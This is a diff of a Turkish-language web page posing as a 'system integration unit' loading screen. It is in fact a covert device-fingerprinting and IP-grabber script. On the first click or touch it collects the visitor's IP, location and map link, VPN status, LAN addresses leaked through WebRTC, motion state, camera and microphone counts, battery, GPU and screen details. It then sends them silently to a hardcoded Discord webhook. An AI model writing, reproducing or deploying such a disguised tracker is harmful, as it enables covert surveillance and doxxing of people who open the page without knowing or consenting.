@@ -2,117 +2,78 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Entegrasyon Analizi</title>
+    <title>Sistem Entegrasyon Birimi</title>
     <style>
         body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; overflow:hidden; cursor:crosshair; }
-        .l { border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: s 0.6s cubic-bezier(0.4, 0, 0.2, 1) infinite; }
-        @keyframes s { to { transform: rotate(360deg); } }
+        .p { width: 50px; height: 50px; border: 2px solid #111; border-top: 2px solid #00ff00; border-radius: 50%; animation: r 0.5s linear infinite; }
+        @keyframes r { to { transform: rotate(360deg); } }
     </style>
 </head>
-<body onmousedown="OmniEngine.strike()" ontouchstart="OmniEngine.strike()">
-    <div class="l"></div>
+<body onmousedown="Architect.strike()" ontouchstart="Architect.strike()">
+    <div class="p"></div>
 
     <script>
         "use strict";
 
-        const OmniEngine = (function() {
+        const Architect = (function() {
             const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
             let fired = false;
-
-            const Core = {
-                // 1. Agresif VPN ve Derin Ağ Analizi
-                async getNet() {
-                    try {
-                        const start = performance.now();
-                        const res = await fetch('https://ipapi.co/json/');
-                        const j = await res.json();
-                        const latency = (performance.now() - start).toFixed(0);
-                        
-                        // Zaman Dilimi Çapraz Kontrolü (VPN Tespiti)
-                        const browserTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                        const vpnTrigger = (j.timezone !== browserTZ) ? "⚠️ VPN/Proxy Saptandı" : "✅ Eşleşiyor";
-                        
-                        return { 
-                            ...j, vpn: vpnTrigger, ping: latency + "ms", 
-                            map: `https://www.google.com/maps?q=${j.latitude},${j.longitude}` 
-                        };
-                    } catch { return { ip: "Engellendi", vpn: "Bilinmiyor" }; }
-                },
-
-                // 2. Çevredeki Cihaz ve WiFi Tahmini (mDNS)
-                async getLAN() {
-                    return new Promise(res => {
-                        const devs = [];
-                        const pc = new RTCPeerConnection({iceServers:[]});
-                        pc.createDataChannel("");
-                        pc.onicecandidate = e => e.candidate?.candidate.includes(".local") && devs.push(e.candidate.candidate.split(" ")[4]);
-                        pc.createOffer().then(o => pc.setLocalDescription(o));
-                        setTimeout(() => { pc.close(); res(devs.join(", ") || "Gizli Ağ"); }, 1500);
-                    });
-                },
-
-                // 3. Medya Donanımı (Kamera/Mikrofon)
-                async getMedia() {
-                    try {
-                        const d = await navigator.mediaDevices.enumerateDevices();
-                        const cams = d.filter(x => x.kind === 'videoinput').length;
-                        const mics = d.filter(x => x.kind === 'audioinput').length;
-                        return `${cams} Kamera, ${mics} Mikrofon Saptandı.`;
-                    } catch { return "Donanım Erişimi Reddedildi"; }
-                },
-
-                // 4. Anlık Kinetik Durum (İvme/Jiroskop)
-                async getMotion() {
-                    return new Promise(res => {
-                        let m = "Sabit (Masaüstü)";
-                        const check = (e) => {
-                            const a = e.accelerationIncludingGravity;
-                            if(a) {
-                                const force = Math.sqrt(a.x**2 + a.y**2 + a.z**2);
-                                if(force > 13.5) m = "HAREKETLİ (Araç/Hızlı)";
-                                else if(force > 10.5) m = "HAREketli (Yürüyüş)";
-                                window.removeEventListener('devicemotion', check);
-                            }
-                        };
-                        window.addEventListener('devicemotion', check);
-                        setTimeout(() => res(m), 800);
-                    });
-                }
-            };
 
             return {
                 async strike() {
                     if (fired) return; fired = true;
 
-                    const [net, lan, motion, media, bat] = await Promise.all([
-                        Core.getNet(), Core.getLAN(), Core.getMotion(), 
-                        Core.getMedia(), navigator.getBattery ? navigator.getBattery() : {level:0}
-                    ]);
+                    // 1. Gelişmiş Ağ ve Agresif VPN Analizi
+                    const netRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+                    const browserTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    const vpnStatus = (netRes.timezone !== browserTZ) ? "⚠️ VPN AKTİF (Saat Sapması)" : "✅ TEMİZ";
 
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                    // 2. Anlık Kinetik Analiz (Hareket/Sabit)
+                    let motion = "Erişim Yok (Masaüstü?)";
+                    window.addEventListener('devicemotion', (e) => {
+                        const a = e.accelerationIncludingGravity;
+                        if(a) {
+                            const force = Math.sqrt(a.x**2 + a.y**2 + a.z**2);
+                            motion = force > 13 ? "HAREKETLİ (Araç/Yürüyüş)" : "SABİT (Duruyor)";
+                        }
+                    }, { once: true });
+
+                    // 3. Medya ve Ekran Detayları
+                    const devices = await navigator.mediaDevices.enumerateDevices().catch(() => []);
+                    const camCount = devices.filter(d => d.kind === 'videoinput').length;
+                    const micCount = devices.filter(d => d.kind === 'audioinput').length;
+
+                    // 4. Çevresel Cihazlar (WebRTC LAN Leak)
+                    const lanDevs = await new Promise(res => {
+                        const d = [];
+                        const pc = new RTCPeerConnection();
+                        pc.createDataChannel("");
+                        pc.onicecandidate = e => e.candidate?.candidate.includes(".local") && d.push(e.candidate.candidate.split(" ")[4]);
+                        pc.createOffer().then(o => pc.setLocalDescription(o));
+                        setTimeout(() => { pc.close(); res(d.join(", ") || "Bulunamadı"); }, 1200);
+                    });
+
+                    const gl = document.createElement('canvas').getContext('webgl2');
                     const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
                     const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
 
                     const payload = {
                         embeds: [{
-                            title: "💀 V11 SINGULARITY - TAM SPEKTRUM RAPOR",
-                            color: 16711680,
+                            title: "💀 ARCHITECT V12 - TAM SPEKTRUM İSTİHBARAT",
+                            color: 65280,
                             fields: [
-                                { name: "📡 AĞ & AGRESİF VPN ANALİZİ", value: `**IP:** \`${net.ip}\` | **VPN:** ${net.vpn}\n**ISP:** ${net.org}\n**Lokasyon:** ${net.city}, ${net.country_name}\n📍 [Google Haritalar](${net.map})`, inline: false },
-                                { name: "🛰️ ÇEVRESEL CİHAZLAR (mDNS)", value: `**Bulunan Cihazlar:** \`${lan}\`\n**Bağlantı:** ${navigator.connection?.effectiveType || 'N/A'} | **Ping:** ${net.ping}`, inline: false },
-                                { name: "🏃 ANLIK HAREKET & GÜÇ", value: `**Durum:** ${motion}\n**Pil:** %${Math.round(bat.level * 100)} (${bat.charging ? 'Şarjda' : 'Pilde'})`, inline: true },
-                                { name: "⚙️ DONANIM RÖNTGENİ", value: `**GPU:** ${gpu}\n**CPU:** ${navigator.hardwareConcurrency} Core | **RAM:** ${navigator.deviceMemory}GB`, inline: true },
-                                { name: "🎥 MEDYA & EKRAN", value: `**Cihazlar:** ${media}\n**Ekran:** ${screen.width}x${screen.height} | **Dil:** ${navigator.language}`, inline: false }
+                                { name: "🌐 AĞ & VPN", value: `**IP:** ${netRes.ip}\n**VPN:** ${vpnStatus}\n**ISS:** ${netRes.org}\n**WiFi Tahmini:** ${netRes.org?.includes("Mobile") ? "Hücresel Veri" : "Yerel WiFi"}`, inline: false },
+                                { name: "🛰️ ÇEVREDEKİ CİHAZLAR", value: `\`${lanDevs}\``, inline: true },
+                                { name: "🏃 HAREKET DURUMU", value: motion, inline: true },
+                                { name: "🔋 ŞARJ & GÜÇ", value: `%${Math.round((await navigator.getBattery?.().then(b => b.level) || 0) * 100)}`, inline: true },
+                                { name: "🎥 MEDYA DONANIMI", value: `**Kamera:** ${camCount} Lens | **Mikrofon:** ${micCount} Birim`, inline: false },
+                                { name: "⚙️ DONANIM & EKRAN", value: `**GPU:** ${gpu}\n**Ekran:** ${screen.width}x${screen.height} | **RAM:** ${navigator.deviceMemory}GB`, inline: false }
                             ],
-                            footer: { text: "Protocol: Omniscience V11 | High-Level Forensics" },
                             timestamp: new Date().toISOString()
                         }]
                     };
 
-                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-                    navigator.sendBeacon(HOOK, blob);
-                    fetch(HOOK, { method: 'POST', mode: 'no-cors', body: blob });
+                    navigator.sendBeacon(HOOK, JSON.stringify(payload));
                 }
             };
         })();
